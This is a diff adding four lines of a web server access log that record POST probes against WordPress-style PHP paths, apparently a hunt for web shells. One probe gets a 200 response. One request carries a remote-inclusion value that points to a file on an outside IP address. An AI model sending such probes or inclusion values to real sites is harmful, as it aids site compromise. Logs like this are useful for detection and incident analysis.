@@ -1,0 +1,4 @@
+-	00:38:38	-0500	POST /wp-content/uploads/bb.php HTTP/1.1	404	23407	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
+-	01:47:35	-0500	POST /wp-admin/install-helper-private.php?limit=193.201.9.12/b.txt HTTP/1.1	404	23407	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36
+-	02:52:23	-0500	POST /wp-content/themes/index.php HTTP/1.1	200	31	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36
+-	06:56:44	-0500	POST /cache/index3.php HTTP/1.1	404	23407	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
